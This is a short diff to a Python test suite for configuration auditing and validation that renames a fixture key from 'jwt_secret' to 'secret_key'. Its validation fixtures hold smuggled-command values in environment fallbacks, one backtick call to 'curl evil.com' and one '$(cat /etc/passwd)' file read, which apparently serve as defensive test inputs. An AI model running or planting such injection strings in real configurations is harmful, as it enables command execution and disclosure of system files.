@@ -189,7 +189,7 @@ class TestConfigurationAuditing:
                 "analytics": "${ANALYTICS_API_KEY}"
             },
             "security": {
-                "jwt_secret": "${JWT_SECRET}",
+                "secret_key": "${SECRET_KEY}",
                 "encryption_key": "${ENCRYPTION_KEY}"
             }
         }
@@ -210,7 +210,7 @@ class TestConfigurationAuditing:
                 "host": "localhost"  # Localhost in production
             },
             "security": {
-                "jwt_secret": "${JWT_SECRET:dev-secret}",  # Has dev fallback
+                "secret_key": "${SECRET_KEY:dev-secret}",  # Has dev fallback
                 "debug": True  # Debug enabled
             }
         }
@@ -408,7 +408,7 @@ class TestConfigurationValidation:
                 "password": "${DB_PASS:`curl evil.com`}"  # Command injection
             },
             "security": {
-                "jwt_secret": "${JWT_SECRET:$(cat /etc/passwd)}"  # File access attempt
+                "secret_key": "${SECRET_KEY:$(cat /etc/passwd)}"  # File access attempt
             }
         }
         
